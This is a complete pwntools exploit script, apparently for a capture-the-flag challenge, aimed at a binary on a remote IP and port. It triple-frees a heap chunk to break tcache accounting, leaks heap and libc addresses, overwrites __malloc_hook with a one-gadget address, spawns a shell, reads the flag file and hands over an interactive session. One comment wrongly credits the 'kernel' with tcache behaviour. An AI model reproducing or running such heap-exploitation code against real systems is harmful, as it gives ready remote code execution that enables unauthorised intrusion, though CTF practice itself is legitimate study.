#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './T'
LIBC = './libc-2.27.so'
HOST = '140.110.112.77'
PORT = 4007

context.binary = BINARY
e = ELF( BINARY )
libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY, env={"LD_PRELOAD": LIBC} )

def s(data):
    r.sendlineafter('>', '1')
    sleep(0.3)
    r.send(data)

def p():
    r.sendlineafter('>', '2')

def f():
    r.sendlineafter('>', '3')

def bye():
    r.sendlineafter('>', '4')
    
ogs = [
    0x4f2c5,
    0x4f322,
    0xe569f,
    0xe5858,
    0xe585f,
    0xe5863,
    0x10a38c,
    0x10a398,
]
#### leak libc
s(b'A'*0x18) # 0
f()
f()
f() # make tcache work
"""
if we only free twice, tcache count will be 2.
And after freeing the ptr three times, count will become -1 (uint very large),
and it will make kernel think tcache is full.
"""
p()
r.recvline()
heap = u64(r.recv(4) + b'\x00'*4)
log.info(f"heap: {hex(heap)}")
s(p64(0x404008))
s('QQ')
s('Q'*0x18)
p()
r.recvuntil('Q'*0x18)
libc_base = u64(r.recv(6) + b'\x00\x00') - libc.sym['_IO_2_1_stdout_']
malloc_hook = 0x3ebc30 + libc_base
log.info(f"libc_base: {hex(libc_base)}")
log.info(f"malloc_hook: {hex(malloc_hook)}")

#### write one gadget to malloc_hook
s(b'B'*0x18)
f()
f()
s(p64(malloc_hook))
s('QQ')
s(p64(libc_base + ogs[1]))

r.sendline('1')
sleep(0.3)
r.sendline('cat /home/`whoami`/flag')
r.interactive()
